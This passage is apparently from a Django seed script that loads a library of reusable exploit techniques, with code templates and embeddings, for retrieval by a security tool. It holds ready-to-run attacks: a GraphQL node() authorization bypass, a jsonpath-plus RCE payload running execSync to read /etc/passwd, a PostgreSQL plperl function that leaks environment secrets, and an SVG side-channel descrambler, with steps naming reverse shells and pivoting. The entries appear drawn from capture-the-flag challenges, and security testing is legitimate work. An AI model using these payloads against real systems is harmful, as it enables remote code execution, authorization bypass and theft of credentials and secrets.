                "7. Decode: skip header(20) + spacer(2), split into 5×7 symbols\\n"
                "   - Hamming distance match against Adafruit GFX 5×7 font → flag characters"
            ),
            "code_template": (
                "# xorshift PRNG (matching JS implementation)\\n"
                "def xorshift(seed):\\n"
                "    value = seed & 0xFFFFFFFF\\n"
                "    def _next():\\n"
                "        nonlocal value\\n"
                "        value ^= (value << 13) & 0xFFFFFFFF\\n"
                "        value ^= (value >> 17)\\n"
                "        value ^= (value << 5) & 0xFFFFFFFF\\n"
                "        value = value & 0xFFFFFFFF\\n"
                "        return value / 0xFFFFFFFF\\n"
                "    return _next\\n\\n"
                "# Fisher-Yates column order from renderSeed\\n"
                "def build_column_order(render_seed, width):\\n"
                "    rng = xorshift(seed_from_hex(render_seed))\\n"
                "    perm = list(range(width))\\n"
                "    for i in range(width - 1, 0, -1):\\n"
                "        j = int(rng() * (i + 1))\\n"
                "        perm[i], perm[j] = perm[j], perm[i]\\n"
                "    return perm"
            ),
            "examples": [{
                "params": {
                    "origins": "3-origin: app.pixelpad.local, share.pixelpad.local, account.pixelpad.local",
                    "bitmap_encoding": "5×7 Adafruit GFX font → SVG <rect filter=...> for '1' bits, plain <rect> for '0'",
                    "measurement_oracle": "measureCell(): filtered=1 gets boost ~0.55+, clear=0 gets boost ~0.03+ (noisy)",
                    "scrambling": "Fisher-Yates shuffle with xorshift PRNG from renderSeed → column permutation",
                    "header_calibration": "20-col random header from layoutSeed, known bits → threshold = midpoint of filtered/clear means",
                    "noise_reduction": "3× session majority voting per pixel eliminates per-session noise",
                    "total_bitmap": "297 columns × 7 rows, 6 scan windows of 50×7",
                },
                "notes": (
                    "This is a sophisticated multi-stage side-channel attack on a web application that encodes "
                    "secrets in SVG bitmap data. The key insight is that even though the SVG is protected by "
                    "strict access controls (staff cookie, CORP, X-Frame-Options), the bot's measurement popup "
                    "chain leaks information through noisy delta artifacts that are accessible to the attacker. "
                    "The noise is overcome through statistical analysis: known header bits enable per-session "
                    "threshold calibration, and multi-session majority voting reduces error rate. The column "
                    "scrambling is reversible because the renderSeed is exposed in the completed review data."
                ),
            }],
            "tags": ["side-channel", "svg", "bitmap", "measurement-oracle", "prng-descramble",
                     "fisher-yates", "xorshift", "majority-voting", "noise-reduction", "threshold-calibration",
                     "multi-origin", "popup-chain", "bot", "information-disclosure"],
        },
    },

    # ── 42. GraphQL Relay Node interface authorization bypass ──
    {
        "name": "graphql_relay_node_interface_auth_bypass",
        "vuln_type": "graphql",
        "sub_technique": "relay_node_auth_bypass",
        "attack_metadata": {
            "name": "GraphQL Relay Node interface bypasses per-type authorization — node(id) lacks is_secret check that note(id) enforces",
            "applies_when": (
                "A GraphQL API implements the Relay-style global `Node` interface with a `node(id: ID!): Node` "
                "query field alongside type-specific query fields (e.g., `note(id: ID!): Note`). The type-specific "
                "resolver (`note`) enforces authorization checks (e.g., checking `is_secret` flag and throwing "
                "an error for classified documents), but the generic `node` resolver queries the same database "
                "table without applying the same authorization logic. Since both resolvers return the same "
                "underlying data (just through different GraphQL paths), an attacker can bypass the authorization "
                "by querying through `node(id)` instead of `note(id)`, using an inline fragment "
                "`... on Note { title content }` to access the concrete type's fields."
            ),
            "prerequisites": [
                "GraphQL API with Relay-style Node interface (node(id: ID!): Node query)",
                "Type-specific resolver (note) has authorization checks (e.g., is_secret)",
                "Node resolver queries same data without equivalent authorization checks",
                "Introspection enabled (to discover node field and Note type)",
                "Sequential integer IDs allow inferring hidden record IDs from gaps",
            ],
            "technique_steps_md": (
                "1. Introspect schema to discover query fields:\\n"
                "   `{ __schema { queryType { fields { name } } } }`\\n"
                "   → finds: notes, note, me, node\\n"
                "2. List public notes to find ID gaps:\\n"
                "   `{ notes { id title isSecret } }` → ids 1,3,4,5 (id=2 missing)\\n"
                "3. Try direct access: `{ note(id: \"2\") { title content } }`\\n"
                "   → 'Access Denied: This note is classified.'\\n"
                "4. Probe via Node interface: `{ node(id: \"2\") { id } }`\\n"
                "   → returns object (not null) — no auth check\\n"
                "5. Use inline fragment for concrete fields:\\n"
                "   `{ node(id: \"2\") { ... on Note { title content } } }`\\n"
                "   → returns classified note content with flag"
            ),
            "code_template": (
                "import json, urllib.request\\n"
                "def gql(url, query):\\n"
                "    req = urllib.request.Request(url, json.dumps({'query': query}).encode(),\\n"
                "        {'Content-Type': 'application/json'})\\n"
                "    return json.loads(urllib.request.urlopen(req).read())\\n\\n"
                "# Bypass: use node() instead of note()\\n"
                "result = gql(ENDPOINT, '''\\n"
                "{ node(id: \"2\") { ... on Note { title content } } }\\n"
                "''')\\n"
                "print(result['data']['node']['content'])  # flag"
            ),
            "examples": [{
                "params": {
                    "protected_resolver": "note(id) checks is_secret → throws GraphQLError('Access Denied')",
                    "unprotected_resolver": "node(id) queries same table without is_secret check",
                    "inline_fragment": "... on Note { title content } — resolves concrete fields through Node interface",
                    "id_inference": "Sequential integer IDs — gap in public notes list reveals hidden note ID",
                    "apollo_server": "ApolloServer with introspection: true, depthLimit(5)",
                },
                "notes": (
                    "This is a classic GraphQL authorization inconsistency where the same data is accessible "
                    "through multiple query paths, but authorization is only applied to one path. The Relay "
                    "Node interface pattern (node(id: ID!): Node) is designed for global object lookup, but "
                    "developers often forget to replicate per-type authorization checks in the generic node "
                    "resolver. The inline fragment `... on Note` allows accessing concrete type fields through "
                    "the interface, effectively bypassing the type-specific resolver's authorization."
                ),
            }],
            "tags": ["auth-bypass", "graphql", "relay", "node-interface", "inline-fragment",
                     "authorization-inconsistency", "introspection", "apollo-server", "idor"],
        },
    },

    # ── 43. jsonpath-plus preventEval:false RCE ──
    {
        "name": "jsonpath_plus_preventeval_rce",
        "vuln_type": "rce",
        "sub_technique": "jsonpath_injection",
        "attack_metadata": {
            "name": "jsonpath-plus preventEval:false allows JavaScript code execution via script expressions",
            "applies_when": (
                "A Node.js application uses the `jsonpath-plus` library to evaluate user-supplied JSONPath "
                "expressions with `preventEval: false` (or the option is omitted, as it defaults to false). "
                "The JSONPath-plus library supports script expressions `?(...)` that are compiled into JavaScript "
                "and executed via `Function()` constructor. An attacker can craft a JSONPath expression that "
                "escapes the intended JSON query context and executes arbitrary JavaScript, including accessing "
                "`process.mainModule.require('child_process')` for OS command execution. The endpoint may be "
                "restricted (e.g., admin-only), requiring a prior authentication bypass or privilege escalation."
            ),
            "prerequisites": [
                "jsonpath-plus library used server-side in Node.js",
                "preventEval is false (default) or explicitly set to false",
                "User-controlled jsonPath expression reaches JSONPath() call",
                "Endpoint accessible (directly or after auth bypass / privilege escalation)",
            ],
            "technique_steps_md": (
                "1. Identify endpoint that accepts a JSONPath expression (e.g., admin search API)\\n"
                "2. Confirm jsonpath-plus usage with preventEval: false (source code or behavior)\\n"
                "3. Craft RCE payload using script expression:\\n"
                "   `$..[?(p=\"this.process.mainModule.require('child_process').execSync('id')\";`\\n"
                "   `test=''[['constructor']][['constructor']](p);test())]`\\n"
                "4. Send payload as the jsonPath parameter to the vulnerable endpoint\\n"
                "5. The `Function()` constructor compiles and executes the injected JavaScript\\n"
                "6. Use RCE to read files, establish reverse shell, or pivot to other services"
            ),
            "code_template": (
                "import requests\\n"
                "s = requests.Session()\\n"
                "# Authenticate first (e.g., admin login)\\n"
                "s.headers['Authorization'] = f'Bearer {token}'\\n\\n"
                "payload = {\\n"
                "    'jsonPath': '$..[?(p=\"this.process.mainModule.require(\\\"child_process\\\")'"
                ".execSync(\\\"cat /etc/passwd\\\").toString()\";'"
                "test=\\\"\\\"[[\\\"constructor\\\"]][[\\\"constructor\\\"]](p);test())]',\\n"
                "    'searchTerm': ''\\n"
                "}\\n"
                "r = s.post(f'{URL}/api/admin/resumes/search', json=payload)\\n"
                "print(r.text)"
            ),
            "examples": [{
                "params": {
                    "library": "jsonpath-plus (npm)",
                    "vulnerable_option": "preventEval: false",
                    "execution_mechanism": "Function() constructor via script expression ?(…)",
                    "payload_pattern": "$..[?(p=\"this.process.mainModule.require('child_process').execSync('cmd')\";test=''[['constructor']][['constructor']](p);test())]",
                    "requires_auth": "Admin role JWT required (obtained via prior SQLi credential extraction)",
                },
                "notes": (
                    "The jsonpath-plus library's script expression feature compiles user-supplied expressions "
                    "into JavaScript code using the Function() constructor. When preventEval is false (the default), "
                    "there is no sandboxing or restriction on what code can be executed. The technique uses "
                    "''[['constructor']][['constructor']] to reach the Function constructor from a string literal, "
                    "bypassing simple keyword filters. This is a well-known prototype chain trick for accessing "
                    "Function() from any JavaScript object."
                ),
            }],
            "tags": ["rce", "jsonpath-plus", "preventEval", "script-expression", "function-constructor",
                     "nodejs", "npm", "code-injection", "server-side"],
        },
    },

    # ── 44. PostgreSQL plperlu environment variable read for flag exfiltration ──
    {
        "name": "postgresql_plperlu_env_var_flag_read",
        "vuln_type": "information_disclosure",
        "sub_technique": "db_env_leak",
        "attack_metadata": {
            "name": "PostgreSQL PL/Perl(U) function reads container environment variables containing secrets",
            "applies_when": (
                "A PostgreSQL database has the `plperl` or `plperlu` (PL/Perl Untrusted) language extension "
                "installed, and the connected database user has CREATE permission on at least one schema. "
                "Secrets such as flags or API keys are stored as environment variables on the database container "
                "(e.g., set via Docker ENV directive). The attacker has obtained database credentials (e.g., from "
                "a .env file read via prior RCE) and can execute DDL statements. PL/Perl functions can access "
                "the `$ENV{}` hash to read process environment variables, allowing exfiltration of secrets that "
                "are not stored in any database table."
            ),
            "prerequisites": [
                "plperl or plperlu extension installed in PostgreSQL",
                "Database user has CREATE privilege on a schema",
                "Secrets stored as environment variables on the DB container",
                "Attacker has DB credentials (from .env file read, SQLi extraction, etc.)",
                "Network access to PostgreSQL port from compromised service or directly",
            ],
            "technique_steps_md": (
                "1. Obtain DB credentials (e.g., via RCE → read .env → DATABASE_URL)\\n"
                "2. Connect to PostgreSQL using the extracted credentials\\n"
                "   `PGPASSWORD=<pass> psql -h db -U db_user -d resume_db`\\n"
                "3. Create a schema owned by the connected user (if needed):\\n"
                "   `CREATE SCHEMA IF NOT EXISTS db_user AUTHORIZATION db_user;`\\n"
                "4. Create a PL/Perl function that reads environment variables:\\n"
                "   ```\\n"
                "   CREATE OR REPLACE FUNCTION db_user.get_flag()\\n"
                "   RETURNS text AS $$\\n"
                "       return $ENV{'flag'};\\n"
                "   $$ LANGUAGE plperl;\\n"
                "   ```\\n"
                "5. Execute the function to retrieve the secret:\\n"
                "   `SELECT db_user.get_flag();`"
            ),
            "code_template": (
                "import subprocess\\n"
                "# Via RCE on the API server, connect to DB and read flag\\n"
                "cmd = (\\n"
                "    'PGPASSWORD=<db_password> psql -h db -U db_user -d resume_db -c \"'\\n"
                "    'CREATE SCHEMA IF NOT EXISTS db_user AUTHORIZATION db_user; '\\n"
                "    'CREATE OR REPLACE FUNCTION db_user.get_flag() '\\n"
                "    'RETURNS text AS \\$\\$return \\\\\\$ENV{\\\"flag\\\"}; \\$\\$ LANGUAGE plperl; '\\n"
                "    'SELECT db_user.get_flag();\"'\\n"
                ")\\n"
                "# Execute via prior RCE (child_process.execSync)"
            ),
            "examples": [{
                "params": {
                    "db_engine": "PostgreSQL 15.8 (custom build from source)",
                    "extensions": "plperl (trusted) + plperlu (untrusted) — both installed",
                    "env_var": "flag (set via Docker ENV directive in db Dockerfile)",
                    "user_privilege": "db_user with GRANT ALL on public schema + CREATE on database",
                    "access_method": "Via RCE on API server → psql to internal db host",
                },
                "notes": (
                    "The distinction between plperl (trusted) and plperlu (untrusted) is important: standard "
                    "PostgreSQL plperl restricts access to $ENV{} and other dangerous Perl features, while "
                    "plperlu allows unrestricted Perl execution including file I/O and environment access. "
                    "However, custom PostgreSQL builds may have relaxed these restrictions. The key insight is "
                    "that secrets stored as container environment variables can be read by any language extension "
                    "that has access to the process environment, even if the secrets are not in any database table."
                ),
            }],
            "tags": ["information-disclosure", "postgresql", "plperl", "plperlu", "env-var",
                     "environment-variable", "docker", "privilege-escalation", "language-extension"],
        },
    },
]


class Command(BaseCommand):
    help = "Seed exploit techniques (transferable tricks, kind='exploit_technique')"

    def add_arguments(self, parser):
        parser.add_argument(
            "--reset", action="store_true",
            help="Delete all existing source='technique' entries and re-seed",
        )

    @transaction.atomic
    def handle(self, *args, **opts):
        if opts.get("reset"):
            deleted = PayloadPattern.objects.filter(source="technique").delete()
            self.stdout.write(self.style.WARNING(f"reset: deleted {deleted}"))

        vuln_by_type: dict[str, VulnerabilityEntry] = {
            v.vuln_type: v for v in VulnerabilityEntry.objects.all()
        }

        created_cnt = 0
        updated_cnt = 0
        for t in TECHNIQUES:
            vuln = vuln_by_type.get(t["vuln_type"])
            obj, created = PayloadPattern.objects.update_or_create(
                name=t["name"],
                source="technique",
                defaults={
                    "vulnerability": vuln,
                    "vuln_type": t["vuln_type"],
                    "sub_technique": t.get("sub_technique"),
                    "category": t.get("category", "exploitation"),
                    "safety_level": t.get("safety_level", "safe"),
                    "request_template": "",
                    "matcher": None,
                    "safety_notes": t["attack_metadata"].get("applies_when", "")[:500],
                    "tags": t.get("tags", []),
                    "attack_metadata": t["attack_metadata"],
                    "is_active": True,
                },
            )
            fk_mark = "FK" if vuln else "!!"
            self.stdout.write(
                f"  technique {'+' if created else '='} [{fk_mark}] {t['name']:40s} ({t['vuln_type']})"
            )
            if created:
                created_cnt += 1
            else:
                updated_cnt += 1

        self.stdout.write(self.style.SUCCESS(
            f"\ntechniques: +{created_cnt} created, ={updated_cnt} updated"
        ))

        # Embedding — enables search_knowledge / retrieve_similar_patterns hits
        if embeddings_available():
            from api.embedding_service import pattern_text
            targets = list(PayloadPattern.objects.filter(source="technique"))
            texts = []
            for p in targets:
                # technique attack_metadata body is richer — embed primarily from that
                meta = p.attack_metadata or {}
                parts = [
                    f"name: {meta.get('name', p.name)}",
                    f"vuln_type: {p.vuln_type}",
                    f"applies_when: {meta.get('applies_when', '')}",
                    f"prerequisites: {' / '.join(meta.get('prerequisites') or [])}",
                    f"steps: {meta.get('technique_steps_md', '')[:500]}",
                    f"tags: {', '.join(meta.get('tags') or p.tags or [])}",
                ]
                texts.append("\n".join(parts))
            self.stdout.write(f"embedding {len(texts)} techniques via {EMBEDDING_MODEL} ...")
            vectors = embed_documents(texts)
            if vectors:
                for p, vec in zip(targets, vectors):
                    p.embedding = vec
                    p.embedding_model = EMBEDDING_MODEL
                    p.save(update_fields=["embedding", "embedding_model"])
                self.stdout.write(self.style.SUCCESS(
                    f"embeddings saved for {len(vectors)} techniques"
                ))
            else:
                self.stdout.write(self.style.WARNING("Embedding generation failed — skipping"))
        else:
            self.stdout.write(self.style.WARNING(
                "Embedding model not available — semantic search will be disabled"
            ))
